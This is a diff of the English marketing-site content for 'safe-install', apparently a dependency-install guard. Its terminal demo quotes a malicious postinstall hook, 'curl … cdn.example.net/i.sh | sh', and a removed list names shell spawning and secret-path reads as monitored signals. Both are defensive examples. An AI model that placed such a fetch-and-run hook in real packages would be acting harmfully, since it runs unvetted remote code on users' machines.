@@ -6,9 +6,11 @@ import type { SiteContent } from './types';
  * Values that are *facts* (rule IDs, exit codes, command strings) are imported
  * from `facts.ts` instead of being written here — see the JSX comments below.
  */
-import { distribution, globalFlags } from './facts';
+import { distribution, globalFlags, repo } from './facts';
 
-const REPO_URL = 'https://github.com/crossben/safe-install';
+/** Derived from the cited module path so there is one place to change it. */
+const REPO_URL = `https://${repo.value}`;
+const DOWNLOAD_URL = `${REPO_URL}/releases/latest/download`;
 const RELEASES_URL = `${REPO_URL}/releases/latest`;
 const SECURITY_URL = `${REPO_URL}/blob/main/SECURITY.md`;
 
@@ -21,14 +23,14 @@ export const en: SiteContent = {
   },
 
   nav: [
-    { label: 'Problem', href: '#problem' },
-    { label: 'How it works', href: '#how-it-works' },
-    { label: 'Rules', href: '#checks' },
-    { label: 'Package managers', href: '#package-managers' },
-    { label: 'Why Go?', href: '#why-go' },
-    { label: 'Runtime monitor', href: '#monitor' },
-    { label: 'CI', href: '#ci' },
-    { label: 'Install', href: '#install' },
+    { label: 'Problem', href: '/#problem' },
+    { label: 'How it works', href: '/#how-it-works' },
+    { label: 'Rules', href: '/#checks' },
+    { label: 'Package managers', href: '/#package-managers' },
+    { label: 'Why Go?', href: '/#why-go' },
+    { label: 'Runtime monitor', href: '/#monitor' },
+    { label: 'CI', href: '/#ci' },
+    { label: 'Install', href: '/#install' },
   ],
 
   hero: {
@@ -36,14 +38,12 @@ export const en: SiteContent = {
     subline:
       'A drop-in replacement for npm, pnpm, Yarn and bun that installs your dependency tree with every lifecycle script switched off — then shows you the ones that wanted to run, and asks before executing a single one.',
     primaryCta: { label: 'View on GitHub', href: REPO_URL, external: true },
-    secondaryCta: { label: 'How it works', href: '#how-it-works' },
+    secondaryCta: { label: 'How it works', href: '/#how-it-works' },
 
     installTabs: [
       {
         os: 'macOS',
-        samples: [
-          { label: 'Homebrew', lang: 'bash', code: distribution.value.homebrew },
-        ],
+        samples: [{ label: 'Homebrew', lang: 'bash', code: distribution.value.homebrew }],
       },
       {
         os: 'Linux',
@@ -51,7 +51,7 @@ export const en: SiteContent = {
           {
             label: '.deb',
             lang: 'bash',
-            code: 'curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.deb\nsudo dpkg -i safe-install_0.1.0_linux_amd64.deb',
+            code: `curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.deb\nsudo dpkg -i safe-install_0.1.0_linux_amd64.deb`,
           },
           { label: '.rpm', lang: 'bash', code: distribution.value.rpm },
         ],
@@ -73,12 +73,24 @@ export const en: SiteContent = {
       { text: '  Analyzing dependency tree…', tone: 'muted' },
       { text: '' },
       { text: '  ⚠ dotenv-helper@4.2.1  ·  risk 74  ·  high', tone: 'danger' },
-      { text: '    SI-SCR-002  script downloads and executes remote code       block', tone: 'danger' },
+      {
+        text: '    SI-SCR-002  script downloads and executes remote code       block',
+        tone: 'danger',
+      },
       { text: '      postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
-      { text: '    SI-REC-001  version published 3h ago                        medium', tone: 'warn' },
-      { text: '    SI-POP-002  4 weekly downloads                              medium', tone: 'warn' },
+      {
+        text: '    SI-REC-001  version published 3h ago                        medium',
+        tone: 'warn',
+      },
+      {
+        text: '    SI-POP-002  4 weekly downloads                              medium',
+        tone: 'warn',
+      },
       { text: '' },
-      { text: '  412 packages  ·  7 want to run install scripts  ·  6 approved by policy', tone: 'info' },
+      {
+        text: '  412 packages  ·  7 want to run install scripts  ·  6 approved by policy',
+        tone: 'info',
+      },
       { text: '' },
       { text: '  ?  dotenv-helper@4.2.1 — run this script?', tone: 'info' },
       { text: '    ❯ Block it', tone: 'ok' },
@@ -147,7 +159,7 @@ export const en: SiteContent = {
 
   checks: {
     eyebrow: 'What it checks',
-    heading: 'Thirteen rules, five questions.',
+    heading: 'Thirteen rules, six questions.',
     lede: 'Every finding carries a rule ID, a severity and the evidence that triggered it — so you can look up exactly why something was flagged and decide for yourself.',
     families: [
       {
@@ -158,22 +170,26 @@ export const en: SiteContent = {
       {
         id: 'recency',
         title: 'Did something just change hands?',
-        blurb: 'Brand-new releases and sudden maintainer changes are where most hijacks show up first.',
+        blurb:
+          'Brand-new releases and sudden maintainer changes are where most hijacks show up first.',
       },
       {
         id: 'popularity',
         title: 'Is this name real, or is it a typo?',
-        blurb: 'Names close to popular packages and packages nobody has heard of both get a second look.',
+        blurb:
+          'Names close to popular packages and packages nobody has heard of both get a second look.',
       },
       {
         id: 'integrity',
         title: 'Does the bytes match the promise?',
-        blurb: 'The lockfile’s integrity hash and the resolved URL are checked against the registry.',
+        blurb:
+          'The lockfile’s integrity hash and the resolved URL are checked against the registry.',
       },
       {
         id: 'maintenance',
         title: 'Is this package still maintained?',
-        blurb: 'Deprecated packages and versions that have been unpublished are surfaced rather than silently installed.',
+        blurb:
+          'Deprecated packages and versions that have been unpublished are surfaced rather than silently installed.',
       },
       {
         id: 'vulns',
@@ -183,13 +199,33 @@ export const en: SiteContent = {
     ],
     severities: [
       { id: 'block', label: 'Block', description: 'Blocked outright, whatever the total score.' },
-      { id: 'high', label: 'High', description: 'Counts toward the risk score and fails a CI run by default.' },
+      {
+        id: 'high',
+        label: 'High',
+        description: 'Counts toward the risk score and fails a CI run by default.',
+      },
       { id: 'medium', label: 'Medium', description: 'Counts toward the risk score.' },
       { id: 'low', label: 'Low', description: 'Reported for information.' },
-      { id: 'advisory', label: 'Per advisory', description: 'Severity comes from the advisory itself.' },
+      {
+        id: 'advisory',
+        label: 'Per advisory',
+        description: 'Severity comes from the advisory itself.',
+      },
     ],
-    scoringNote: 'Scores are a weighted sum capped at 100: below 30 is low, 30–59 is medium, 60 and above is high.',
+    scoringNote:
+      'Scores are a weighted sum capped at 100: below 30 is low, 30–59 is medium, 60 and above is high.',
     explainNote: 'Not sure what a rule means? `safe-install explain SI-SCR-002` tells you.',
+    releaseAgeGate: {
+      heading: 'It does not just warn about fresh versions. It refuses them.',
+      body: 'Every supply-chain hijack needs a freshly compromised release, because that is the only moment a maintainer account can push something new and the next audit will catch. So rather than flagging a version published three hours ago and installing it anyway, safe-install resolves to the newest version that is at least minReleaseAge old. The bad release never lands.',
+      native:
+        'When your package manager has a native setting, safe-install uses it: the gate is computed from policy and passed straight through.',
+      fallback:
+        'When it does not, safe-install resolves your direct dependencies itself — semver range intersected with the age cutoff, newest version that survives — and pins them. Transitive dependencies are then caught by SI-REC-001 as findings.',
+      override:
+        'Packages you trust to move fast can be excluded by glob, and --min-age overrides the gate for a single run. --min-age 0 turns it off.',
+      credit: 'The idea is borrowed from safe-npm.',
+    },
   },
 
   packageManagers: {
@@ -266,15 +302,9 @@ export const en: SiteContent = {
     backendBody:
       'When CAP_BPF or root is available, eBPF tracepoints on sys_enter_execve, connect and openat give direct kernel-level visibility. Without them, safe-install falls back to strace -f, tracing the same three syscalls. With neither, the monitor reports that it is unavailable rather than pretending it is watching.',
     signalsHeading: 'What it watches for',
+    actionHeading: 'Report, or kill',
     actionBody:
       'By default the monitor only reports. Pass --monitor=kill and a high-severity event takes down the whole process tree, which is what you want when a script you approved turns out not to be the script you read.',
-    signals: [
-      'Unexpected network destinations — anything that is not the registry',
-      'Spawning shells and downloaders',
-      'Reads of secret paths',
-      'Writes outside the project, `node_modules` and the cache',
-      'Writes to shell rc files, `~/.ssh`, `/etc`, cron and systemd units',
-    ],
     copy: {
       neutral: 'Checking your platform…',
       roasts: {
@@ -318,7 +348,8 @@ export const en: SiteContent = {
     lede: 'In CI, safe-install runs non-interactively: no prompts, a machine-readable report, and an exit code your pipeline can branch on.',
     commandHeading: 'The whole check',
     exitCodesHeading: 'Exit codes',
-    exitCodesNote: 'Stable contract for pipelines — the names below are the four the tool promises to return.',
+    exitCodesNote:
+      'Stable contract for pipelines — the names below are the four the tool promises to return.',
     workflowTitle: '.github/workflows/supply-chain.yml',
     workflow: {
       label: 'GitHub Actions',
@@ -376,14 +407,15 @@ jobs:
       {
         id: 'verify',
         title: 'Direct download, verified',
-        summary: 'Every release ships a checksum and a cosign keyless signature. Verify before you run it.',
+        summary:
+          'Every release ships a checksum and a cosign keyless signature. Verify before you run it.',
         samples: [
           {
             label: 'verify',
             lang: 'bash',
-            code: `curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz
-curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz.sig
-curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz.pem
+            code: `curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz
+curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz.sig
+curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz.pem
 
 cosign verify-blob \\
   --certificate safe-install_0.1.0_linux_amd64.tar.gz.pem \\
@@ -403,6 +435,11 @@ sudo install safe-install /usr/local/bin/`,
 
   footer: {
     tagline: 'Install dependencies. Not malware.',
+    byline: {
+      label: 'Built by',
+      name: 'Ben Hattab',
+      url: 'https://benhattab.pro',
+    },
     securityHeading: 'Found a bypass?',
     securityBody:
       'Please tell us privately through SECURITY.md rather than opening a public issue. We would much rather fix it quietly than ship a workaround on your behalf.',
